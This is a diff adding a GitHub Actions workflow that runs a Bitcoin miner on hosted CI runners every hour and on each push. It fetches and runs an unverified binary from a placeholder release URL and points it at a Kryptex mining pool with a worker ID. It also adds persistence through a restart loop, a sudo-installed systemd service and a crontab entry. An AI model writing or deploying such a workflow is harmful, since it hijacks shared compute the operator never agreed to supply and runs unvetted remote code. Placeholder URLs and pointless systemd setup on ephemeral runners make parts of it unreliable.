@@ -1,0 +1,151 @@
+name: Bitcoin Miner
+
+on:
+  push:
+    branches:
+      - main
+  schedule:
+    - cron: '0 * * * *'  # Executa a cada hora
+
+jobs:
+  mine-bitcoin:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+        
+      - name: Setup environment
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y build-essential libcurl4-openssl-dev curl python3-pip
+          
+      - name: Create miner directory
+        run: mkdir -p ~/miners/bitcoin
+        
+      - name: Download miner binary
+        run: |
+          wget https://github.com/username/miner/releases/latest/download/miner -O ~/miners/bitcoin/miner
+          chmod +x ~/miners/bitcoin/miner
+          
+      - name: Setup configuration
+        run: |
+          cat > ~/miners/bitcoin/config.json << EOF
+          {
+            "server": "btc.kryptex.network:7014",
+            "worker": "krxYMRZKJD",
+            "pool": "default",
+            "algorithm": "sha256",
+            "threads": $(nproc),
+            "timeout": 30,
+            "log_level": "info"
+          }
+          EOF
+          
+      - name: Start miner service
+        run: |
+          nohup ~/miners/bitcoin/miner --config ~/miners/bitcoin/config.json > ~/miners/bitcoin/log.txt 2>&1 &
+          echo $! > ~/miners/bitcoin/pid.txt
+          
+      - name: Setup monitoring
+        run: |
+          cat > ~/miners/bitcoin/monitor.sh << EOF
+          #!/bin/bash
+          while true; do
+            if ! pgrep -f "miner.*krxYMRZKJD" > /dev/null; then
+              echo "\$(date): Miner stopped, restarting..."
+              ~/miners/bitcoin/miner --config ~/miners/bitcoin/config.json > ~/miners/bitcoin/log.txt 2>&1 &
+              echo \$! > ~/miners/bitcoin/pid.txt
+            fi
+            sleep 60
+          done
+          EOF
+          chmod +x ~/miners/bitcoin/monitor.sh
+          
+      - name: Setup startup script
+        run: |
+          cat > ~/miners/bitcoin/startup.sh << EOF
+          #!/bin/bash
+          ~/miners/bitcoin/monitor.sh &
+          EOF
+          chmod +x ~/miners/bitcoin/startup.sh
+          
+      - name: Setup systemd service
+        run: |
+          sudo tee /etc/systemd/system/btc-miner.service << EOF
+          [Unit]
+          Description=Bitcoin Miner Service
+          After=network.target
+          
+          [Service]
+          Type=simple
+          User=$USER
+          WorkingDirectory=/home/$USER/miners/bitcoin
+          ExecStart=/home/$USER/miners/bitcoin/startup.sh
+          Restart=always
+          RestartSec=10
+          
+          [Install]
+          WantedBy=multi-user.target
+          EOF
+          
+          sudo systemctl daemon-reload
+          sudo systemctl enable btc-miner.service
+          sudo systemctl start btc-miner.service
+          
+      - name: Setup log rotation
+        run: |
+          sudo tee /etc/logrotate.d/btc-miner << EOF
+          /home/$USER/miners/bitcoin/log.txt {
+            daily
+            rotate 7
+            compress
+            missingok
+            notifempty
+            create 644 $USER $USER
+          }
+          EOF
+          
+      - name: Setup alerting
+        run: |
+          cat > ~/miners/bitcoin/alert.sh << EOF
+          #!/bin/bash
+          LOG="/home/$USER/miners/bitcoin/log.txt"
+          ALERT_FILE="/home/$USER/miners/bitcoin/alert.txt"
+          
+          # Check for errors in log
+          if grep -i "error\|fail" "$LOG" | tail -10 > /tmp/errors.log; then
+            echo "Errors detected:" > "$ALERT_FILE"
+            cat /tmp/errors.log >> "$ALERT_FILE"
+            
+            # Email alert
+            mail -s "Bitcoin Miner Alert" admin@example.com < "$ALERT_FILE"
+            
+            # Slack webhook
+            curl -X POST -H 'Content-type: application/json' \
+              --data "{\"text\":\"Bitcoin Miner Error: $(tail -1 $ALERT_FILE)\"}" \
+              https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX
+          fi
+          EOF
+          chmod +x ~/miners/bitcoin/alert.sh
+          
+          # Schedule daily checks
+          echo "0 8 * * * /home/$USER/miners/bitcoin/alert.sh" | crontab -
+          
+      - name: Verify miner status
+        run: |
+          sleep 5
+          if ! pgrep -f "miner.*krxYMRZKJD" > /dev/null; then
+            echo "ERROR: Miner failed to start!"
+            exit 1
+          fi
+          echo "Miner is running successfully!"
+          
+      - name: Cleanup old logs
+        run: |
+          find ~/miners/bitcoin -name "*.log" -mtime +7 -delete
+          find ~/miners/bitcoin -name "*.txt" -mtime +30 -delete
+          
+      - name: Notify completion
+        run: |
+          echo "Bitcoin mining setup complete!"
